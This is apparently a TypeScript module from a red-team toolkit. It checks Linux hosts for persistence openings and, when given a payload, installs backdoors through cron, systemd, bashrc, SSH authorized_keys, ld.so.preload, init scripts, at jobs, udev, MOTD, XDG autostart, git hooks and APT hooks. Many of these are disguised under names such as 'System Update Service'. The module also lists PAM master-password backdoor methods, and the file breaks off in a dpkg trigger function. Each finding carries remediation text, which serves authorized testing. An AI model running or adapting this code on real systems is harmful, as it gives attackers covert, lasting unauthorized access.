import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]
  const payload = argVal(args, "--payload")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"

  const script = `
echo "--- Current Cron Jobs ---"
crontab -l 2>/dev/null && echo "[*] User crontab exists" || echo "[-] No user crontab"
echo ""
echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
echo ""
echo "--- Cron Directories ---"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
  if [ -d "$d" ]; then
    count=$(ls -1 "$d" 2>/dev/null | wc -l)
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    echo "$d: $count scripts ($writable)"
  fi
done
echo ""
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo ""
${payload ? `
echo "--- Installing Cron Persistence ---"
if [ -w /etc/cron.d/ ]; then
  echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
elif command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null; echo "${schedule} ${payload}") | crontab - 2>/dev/null && echo "[+] Added to user crontab" || echo "[-] Failed to add to user crontab"
else
  echo "[-] No writable cron location found"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-CRONP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "cron",
      title: "Cron persistence installed",
      details: `Cron job persistence established with schedule: ${schedule}`,
      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
    })
  }

  const writable = (r.stdout.match(/WRITABLE/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-CRONP-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "cron_dirs",
      title: "Writable cron directories found",
      details: `${writable} cron directory/directories are writable — persistence can be established`,
      remediation: "Restrict cron directory permissions to root only (755 with root ownership).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function systemdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Systemd Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-update"
  const userLevel = hasFlag(args, "--user")

  const script = `
echo "--- Init System Check ---"
if [ -d /run/systemd/system ]; then
  echo "[+] systemd is the init system"
else
  echo "[-] systemd is NOT running — this persistence method will not work"
  exit 1
fi
echo ""
echo "--- Existing Custom Services ---"
${userLevel ? `
ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
` : `
find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
`}
echo ""
${payload ? `
echo "--- Installing Systemd Persistence ---"
${userLevel ? `
mkdir -p ~/.config/systemd/user 2>/dev/null
cat > ~/.config/systemd/user/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
` : `
cat > /etc/systemd/system/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload 2>/dev/null
systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
`}
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Service enabled") || r.stdout.includes("[+] User service enabled")) {
    findings.push({
      checkId: "LNX-SYSDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `systemd/${name}.service`,
      title: `Systemd ${userLevel ? "user " : ""}service persistence installed`,
      details: `Service ${name}.service created and enabled${userLevel ? " at user level (no root needed)" : " at system level"}. Restarts on failure with 60s delay.`,
      remediation: `Remove with: systemctl ${userLevel ? "--user " : ""}disable --now ${name}.service && rm ${userLevel ? "~/.config/systemd/user" : "/etc/systemd/system"}/${name}.service`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function bashrcPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Bashrc/Profile Persistence ==="]
  const payload = argVal(args, "--payload")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Shell RC Files ---"
for dir in /root /home/*; do
  user=$(basename "$dir")
  if [ -d "$dir" ]; then
    for rc in .bashrc .bash_profile .profile .zshrc .zprofile; do
      if [ -f "$dir/$rc" ]; then
        writable=$([ -w "$dir/$rc" ] && echo "WRITABLE" || echo "read-only")
        echo "  $dir/$rc ($writable)"
      fi
    done
  fi
done
echo ""
echo "--- Global Profiles ---"
for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
  if [ -f "$f" ]; then
    writable=$([ -w "$f" ] && echo "WRITABLE" || echo "read-only")
    echo "  $f ($writable)"
  fi
done
echo ""
${payload ? `
echo "--- Installing Bashrc Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
  if [ -f "$rc" ] && [ -w "$rc" ]; then
    echo "" >> "$rc"
    echo "# system update check" >> "$rc"
    echo "${payload} &>/dev/null &" >> "$rc"
    echo "[+] Payload appended to $rc"
    break
  fi
done
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const writableRcs = (r.stdout.match(/WRITABLE/g) || []).length
  if (writableRcs > 0) {
    findings.push({
      checkId: "LNX-BASHRC-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "shell_rc",
      title: "Writable shell RC files found",
      details: `${writableRcs} writable shell RC file(s) available for persistence injection`,
      remediation: "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
    })
  }

  if (r.stdout.includes("[+] Payload appended")) {
    findings.push({
      checkId: "LNX-BASHRC-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "shell_rc",
      title: "Shell RC persistence installed",
      details: "Payload appended to shell RC file — executes on every interactive shell login",
      remediation: "Review .bashrc, .profile, .bash_profile, .zshrc for unauthorized entries. Remove injected lines.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshAuthorizedKeys(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Authorized Keys Persistence ==="]
  const pubkey = argVal(args, "--pubkey")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Existing Authorized Keys ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    writable=$([ -w "$dir/.ssh/authorized_keys" ] && echo "WRITABLE" || echo "read-only")
    echo "  $dir/.ssh/authorized_keys: $count key(s) ($writable)"
  elif [ -d "$dir" ]; then
    sshdir_writable=$([ -w "$dir" ] && echo "home-writable" || echo "home-read-only")
    echo "  $dir: no authorized_keys ($sshdir_writable)"
  fi
done
echo ""
echo "--- SSHD Config ---"
grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)" /etc/ssh/sshd_config 2>/dev/null
echo ""
${pubkey ? `
echo "--- Installing SSH Key Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
mkdir -p "$target_dir/.ssh" 2>/dev/null
chmod 700 "$target_dir/.ssh" 2>/dev/null
echo "${pubkey}" >> "$target_dir/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key added to $target_dir/.ssh/authorized_keys" || echo "[-] Failed to write authorized_keys"
chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
` : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Key added")) {
    findings.push({
      checkId: "LNX-AUTHKEYS-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "ssh_authorized_keys",
      title: "SSH authorized_keys persistence installed",
      details: "SSH public key added to authorized_keys — passwordless SSH access established",
      remediation: "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
    })
  }

  const writableHomes = (r.stdout.match(/home-writable/g) || []).length
  if (writableHomes > 0) {
    findings.push({
      checkId: "LNX-AUTHKEYS-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "ssh_authorized_keys",
      title: "Writable home directories without SSH keys",
      details: `${writableHomes} user home(s) are writable and have no authorized_keys — SSH key persistence possible`,
      remediation: "Restrict home directory permissions. Monitor authorized_keys file changes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ldSoPreload(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ld.so.preload Persistence ==="]
  const libPath = argVal(args, "--library-path")

  const script = `
echo "--- /etc/ld.so.preload Status ---"
if [ -f /etc/ld.so.preload ]; then
  echo "[!] /etc/ld.so.preload EXISTS:"
  cat /etc/ld.so.preload
  echo ""
  echo "Permissions:"
  ls -la /etc/ld.so.preload
else
  echo "[-] /etc/ld.so.preload does not exist"
  writable=$([ -w /etc/ ] && echo "WRITABLE" || echo "read-only")
  echo "/etc/ is $writable"
fi
echo ""
echo "--- Current ld.so.conf.d entries ---"
ls -la /etc/ld.so.conf.d/ 2>/dev/null
echo ""
echo "--- Shared library cache ---"
ldconfig -p 2>/dev/null | wc -l
echo ""
${libPath ? `
echo "--- Installing ld.so.preload Persistence ---"
if [ "$(id -u)" = "0" ]; then
  echo "${libPath}" >> /etc/ld.so.preload && echo "[+] Library added to /etc/ld.so.preload: ${libPath}" || echo "[-] Failed to write /etc/ld.so.preload"
else
  echo "[-] Root required for /etc/ld.so.preload modification"
fi
` : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
echo "[*] WARNING: Every dynamically linked process will load this library"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Library added")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "INSTALLED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload persistence installed",
      details: `Library ${libPath} added to /etc/ld.so.preload — loaded into every dynamically linked process on the system`,
      remediation: "Remove entry from /etc/ld.so.preload. Delete the malicious shared library. Run ldconfig.",
    })
  }

  if (r.stdout.includes("ld.so.preload EXISTS")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload file already exists",
      details: "An existing /etc/ld.so.preload was found — may indicate existing compromise or legitimate use",
      remediation: "Audit /etc/ld.so.preload contents. Verify all listed libraries are legitimate.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sysvinitPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SysV Init Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-daemon"

  const script = `
echo "--- Init System Check ---"
if [ -d /etc/init.d ]; then
  echo "[+] /etc/init.d exists"
  ls -la /etc/init.d/ 2>/dev/null | head -20
  writable=$([ -w /etc/init.d/ ] && echo "WRITABLE" || echo "read-only")
  echo "Directory is: $writable"
else
  echo "[-] /etc/init.d does not exist"
fi
echo ""
echo "--- Run Level Links ---"
ls /etc/rc*.d/ 2>/dev/null | head -20
echo ""
${payload ? `
echo "--- Installing SysV Init Persistence ---"
cat > /etc/init.d/${name} << 'INITSCRIPT'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          ${name}
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System maintenance daemon
### END INIT INFO
case "\$1" in
  start) ${payload} & ;;
  stop) pkill -f "${payload}" 2>/dev/null ;;
  *) echo "Usage: \$0 {start|stop}" ;;
esac
INITSCRIPT
chmod +x /etc/init.d/${name} 2>/dev/null
if command -v update-rc.d >/dev/null 2>&1; then
  update-rc.d ${name} defaults 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] update-rc.d failed"
elif command -v chkconfig >/dev/null 2>&1; then
  chkconfig --add ${name} 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] chkconfig failed"
else
  echo "[+] Init script written but could not auto-link. Manually run: ln -s /etc/init.d/${name} /etc/rc2.d/S99${name}"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Init script installed")) {
    findings.push({
      checkId: "LNX-INITP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `/etc/init.d/${name}`,
      title: "SysV init script persistence installed",
      details: `Init script ${name} created in /etc/init.d/ with run level links — starts on boot`,
      remediation: `Remove with: update-rc.d ${name} remove && rm /etc/init.d/${name}`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function atJobPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== At Job Persistence ==="]
  const payload = argVal(args, "--payload")
  const time = argVal(args, "--time") || "now + 1 hour"

  const script = `
echo "--- at/atd Status ---"
command -v at >/dev/null 2>&1 && echo "[+] at is available" || echo "[-] at is not installed"
pgrep -x atd >/dev/null 2>&1 && echo "[+] atd is running" || echo "[-] atd is NOT running"
echo ""
echo "--- Pending at Jobs ---"
atq 2>/dev/null || echo "[-] Cannot list at queue"
echo ""
echo "--- /etc/at.allow and /etc/at.deny ---"
cat /etc/at.allow 2>/dev/null && echo "[*] at.allow exists" || echo "[-] No at.allow"
cat /etc/at.deny 2>/dev/null && echo "[*] at.deny exists" || echo "[-] No at.deny"
echo ""
${payload ? `
echo "--- Installing at Job ---"
echo "${payload}" | at ${time} 2>&1 && echo "[+] at job scheduled for: ${time}" || echo "[-] Failed to schedule at job"
echo ""
echo "--- Updated Queue ---"
atq 2>/dev/null
` : `echo "[*] Dry run — pass --payload <cmd> --time <timespec> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] at job scheduled")) {
    findings.push({
      checkId: "LNX-ATJOB-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "at_queue",
      title: "at job persistence scheduled",
      details: `at job scheduled for: ${time}`,
      remediation: "Review at queue with atq. Remove jobs with atrm. Consider disabling atd if not needed.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function udevRulesPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Udev Rules Persistence ==="]
  const payload = argVal(args, "--payload")
  const trigger = argVal(args, "--trigger") || 'add'

  const script = `
echo "--- Udev Rules Directories ---"
ls -la /etc/udev/rules.d/ 2>/dev/null || echo "[-] /etc/udev/rules.d/ not found"
ls -la /lib/udev/rules.d/ 2>/dev/null | head -10
echo ""
echo "--- Udev Status ---"
udevadm info --version 2>/dev/null || echo "[-] udevadm not available"
echo ""
${payload ? `
echo "--- Installing Udev Rule ---"
if [ -w /etc/udev/rules.d/ ] || [ "$(id -u)" = "0" ]; then
  echo 'ACTION=="${trigger}", RUN+="${payload}"' > /etc/udev/rules.d/99-cs-persist.rules 2>/dev/null
  udevadm control --reload-rules 2>/dev/null
  echo "[+] Udev rule installed: /etc/udev/rules.d/99-cs-persist.rules (trigger: ${trigger})"
else
  echo "[-] Root required to write udev rules"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --trigger <action> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Udev rule installed")) {
    findings.push({
      checkId: "LNX-UDEV-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/udev/rules.d/99-cs-persist.rules",
      title: "Udev rule persistence installed",
      details: `Udev rule triggers on ACTION=="${trigger}" — executes payload on device events`,
      remediation: "Audit /etc/udev/rules.d/ for unauthorized rules. Remove and run udevadm control --reload-rules.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function pamBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== PAM Backdoor Analysis ==="]

  const script = `
echo "--- PAM Configuration ---"
ls -la /etc/pam.d/ 2>/dev/null | head -20
echo ""
echo "--- PAM Auth Modules ---"
grep -rn "pam_unix" /etc/pam.d/ 2>/dev/null | head -10
echo ""
echo "--- PAM Shared Objects ---"
find /lib/security/ /lib64/security/ /usr/lib/security/ /usr/lib64/security/ -name "pam_*.so" -type f 2>/dev/null | head -20
echo ""
echo "--- pam_unix.so Location ---"
find / -name "pam_unix.so" -type f 2>/dev/null 2>&1 | head -5
echo ""
echo "--- PAM Module Integrity ---"
for f in $(find /lib/security/ /lib64/security/ /usr/lib/security/ /usr/lib64/security/ -name "pam_unix.so" 2>/dev/null); do
  md5sum "$f" 2>/dev/null
  ls -la "$f" 2>/dev/null
done
echo ""
echo "--- common-auth / system-auth ---"
cat /etc/pam.d/common-auth 2>/dev/null || cat /etc/pam.d/system-auth 2>/dev/null || echo "[-] Neither common-auth nor system-auth found"
echo ""
echo "[*] PAM backdoor methods:"
echo "  1. Patch pam_unix.so to accept a master password (requires C compilation + replacement)"
echo "  2. Add 'auth sufficient pam_permit.so' to /etc/pam.d/sshd (allows any password)"
echo "  3. Add custom PAM module with hardcoded credential check"
echo "  4. Modify pam_unix.so source and recompile with backdoor password"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("pam_unix.so")) {
    findings.push({
      checkId: "LNX-PAM-001",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: "pam",
      title: "PAM authentication modules enumerated",
      details: "PAM configuration and module locations identified — backdoor installation paths mapped",
      remediation: "Monitor PAM module integrity with AIDE/Tripwire. Hash-check pam_unix.so against distribution packages.",
    })
  }

  findings.push({
    checkId: "LNX-PAM-002",
    provider: "linuxhook",
    severity: "CRITICAL",
    status: "IDENTIFIED",
    resource: "pam",
    title: "PAM backdoor vectors identified",
    details: "PAM modules can be patched or replaced to accept a master password — extremely persistent and stealthy",
    remediation: "Use package manager to verify PAM module integrity (dpkg --verify libpam-modules / rpm -V pam). Monitor /etc/pam.d/ for changes.",
  })

  return { output: output.join("\n"), findings }
}

export async function motdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== MOTD Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "99-cs-update"

  const script = `
echo "--- MOTD Scripts ---"
ls -la /etc/update-motd.d/ 2>/dev/null || echo "[-] /etc/update-motd.d/ not found"
echo ""
echo "--- MOTD Directory Permissions ---"
stat /etc/update-motd.d/ 2>/dev/null | grep -i "access"
echo ""
${payload ? `
echo "--- Installing MOTD Persistence ---"
if [ "$(id -u)" = "0" ] || [ -w /etc/update-motd.d/ ]; then
  printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > /etc/update-motd.d/${name} 2>/dev/null
  chmod +x /etc/update-motd.d/${name} 2>/dev/null
  echo "[+] MOTD script installed: /etc/update-motd.d/${name} (runs as root on SSH login)"
else
  echo "[-] Cannot write to /etc/update-motd.d/ — root required"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] MOTD script installed")) {
    findings.push({
      checkId: "LNX-MOTDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `/etc/update-motd.d/${name}`,
      title: "MOTD persistence installed",
      details: `MOTD script runs as root on every SSH login — payload executes with root privileges`,
      remediation: `Remove: rm /etc/update-motd.d/${name}. Audit all scripts in /etc/update-motd.d/.`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function xdgAutostart(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== XDG Autostart Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "system-update"

  const script = `
echo "--- XDG Autostart Directories ---"
for d in /etc/xdg/autostart ~/.config/autostart; do
  if [ -d "$d" ]; then
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    count=$(ls -1 "$d"/*.desktop 2>/dev/null | wc -l)
    echo "  $d: $count entries ($writable)"
  else
    echo "  $d: does not exist"
  fi
done
echo ""
${payload ? `
echo "--- Installing XDG Autostart ---"
target_dir="$HOME/.config/autostart"
if [ "$(id -u)" = "0" ] && [ -d /etc/xdg/autostart ]; then
  target_dir="/etc/xdg/autostart"
fi
mkdir -p "$target_dir" 2>/dev/null
cat > "$target_dir/${name}.desktop" << DESKTOP
[Desktop Entry]
Type=Application
Name=System Update Check
Exec=${payload}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
DESKTOP
echo "[+] XDG autostart entry created: $target_dir/${name}.desktop"
` : `echo "[*] Dry run — pass --payload <cmd> --name <entry-name> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] XDG autostart entry created")) {
    findings.push({
      checkId: "LNX-XDG-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "xdg_autostart",
      title: "XDG autostart persistence installed",
      details: `Desktop entry ${name}.desktop created — executes on GUI session login`,
      remediation: "Audit /etc/xdg/autostart/ and ~/.config/autostart/ for unauthorized .desktop files.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gitHookPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Git Hook Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- Git Repositories ---"
find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
  repo=$(dirname "$gitdir")
  hookdir="$gitdir/hooks"
  writable=$([ -w "$hookdir" ] && echo "WRITABLE" || echo "read-only")
  echo "  $repo ($writable)"
  for hook in post-checkout post-merge pre-push pre-commit; do
    if [ -f "$hookdir/$hook" ]; then
      echo "    [!] $hook exists"
    fi
  done
done
echo ""
${payload ? `
echo "--- Installing Git Hook Persistence ---"
installed=0
find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
  hookdir="$gitdir/hooks"
  if [ -w "$hookdir" ]; then
    for hook in post-checkout post-merge; do
      if [ ! -f "$hookdir/$hook" ]; then
        printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > "$hookdir/$hook"
        chmod +x "$hookdir/$hook"
        echo "[+] Hook installed: $hookdir/$hook"
        break
      fi
    done
  fi
done
` : `echo "[*] Dry run — pass --payload <cmd> to install hooks in discovered repositories."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hooks = (r.stdout.match(/\[+\] Hook installed/g) || []).length
  if (hooks > 0) {
    findings.push({
      checkId: "LNX-GITHOOK-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "git_hooks",
      title: "Git hook persistence installed",
      details: `${hooks} git hook(s) installed — triggers on git checkout/merge/push operations`,
      remediation: "Audit .git/hooks/ directories in all repositories. Remove unauthorized hook scripts.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function kernelModulePersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Kernel Module Persistence ==="]

  const script = `
echo "--- Loaded Modules ---"
lsmod 2>/dev/null | head -20
echo ""
echo "--- Boot-time Module Config ---"
cat /etc/modules 2>/dev/null || echo "[-] /etc/modules not found"
echo ""
ls -la /etc/modules-load.d/ 2>/dev/null || echo "[-] /etc/modules-load.d/ not found"
echo ""
echo "--- Modprobe Config ---"
ls -la /etc/modprobe.d/ 2>/dev/null
echo ""
echo "--- Module Build Dirs ---"
ls -d /lib/modules/$(uname -r)/build 2>/dev/null && echo "[+] Kernel headers available (can compile modules)" || echo "[-] No kernel headers"
echo ""
echo "--- Writable Module Paths ---"
for d in /etc/modules-load.d /etc/modprobe.d /lib/modules; do
  [ -w "$d" ] && echo "[+] $d is WRITABLE" || echo "  $d is read-only"
done
echo ""
echo "[*] Kernel module persistence methods:"
echo "  1. Add module name to /etc/modules or /etc/modules-load.d/*.conf for boot-time loading"
echo "  2. Compile custom .ko module and place in /lib/modules/\$(uname -r)/extra/"
echo "  3. Use modprobe.d/install directive to run commands on module load"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("Kernel headers available")) {
    findings.push({
      checkId: "LNX-KMOD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "kernel_modules",
      title: "Kernel headers available for module compilation",
      details: "Kernel headers installed — custom kernel modules can be compiled and loaded for rootkit-level persistence",
      remediation: "Remove kernel headers (linux-headers-*) on production systems if not needed. Monitor module loading with auditd.",
    })
  }

  const writablePaths = (r.stdout.match(/is WRITABLE/g) || []).length
  if (writablePaths > 0) {
    findings.push({
      checkId: "LNX-KMOD-002",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "IDENTIFIED",
      resource: "kernel_modules",
      title: "Writable kernel module paths",
      details: `${writablePaths} kernel module path(s) are writable — kernel-level persistence possible`,
      remediation: "Restrict module paths to root only. Enable module signature verification in kernel config.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function aptHookPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== APT Hook Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- APT Hooks ---"
ls -la /etc/apt/apt.conf.d/ 2>/dev/null || echo "[-] /etc/apt/apt.conf.d/ not found (not a Debian/Ubuntu system?)"
echo ""
echo "--- Existing Hook Files ---"
grep -rn "DPkg::Pre-Invoke\|DPkg::Post-Invoke\|APT::Update::Pre-Invoke\|APT::Update::Post-Invoke" /etc/apt/apt.conf.d/ 2>/dev/null
echo ""
${payload ? `
echo "--- Installing APT Hook ---"
if [ "$(id -u)" = "0" ] || [ -w /etc/apt/apt.conf.d/ ]; then
  echo 'DPkg::Post-Invoke {"${payload} &>/dev/null &";};' > /etc/apt/apt.conf.d/99cs-update 2>/dev/null
  echo "[+] APT hook installed: /etc/apt/apt.conf.d/99cs-update (triggers on every apt operation)"
else
  echo "[-] Root required to write to /etc/apt/apt.conf.d/"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] APT hook installed")) {
    findings.push({
      checkId: "LNX-APT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/apt/apt.conf.d/99cs-update",
      title: "APT hook persistence installed",
      details: "DPkg::Post-Invoke hook triggers on every apt install/upgrade/remove operation",
      remediation: "Audit /etc/apt/apt.conf.d/ for unauthorized hook files. Remove and run apt-get update.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function dpkgTriggerPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== DPKG Trigger Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- DPKG Info Directory ---"
ls /var/lib/dpkg/info/ 2>/dev/null | head -20
echo ""
echo "--- Existing Postinst Scripts ---"
ls /var/lib/dpkg/info/*.postinst 2>/dev/null | head -10
echo ""
echo "--- DPKG Triggers ---"
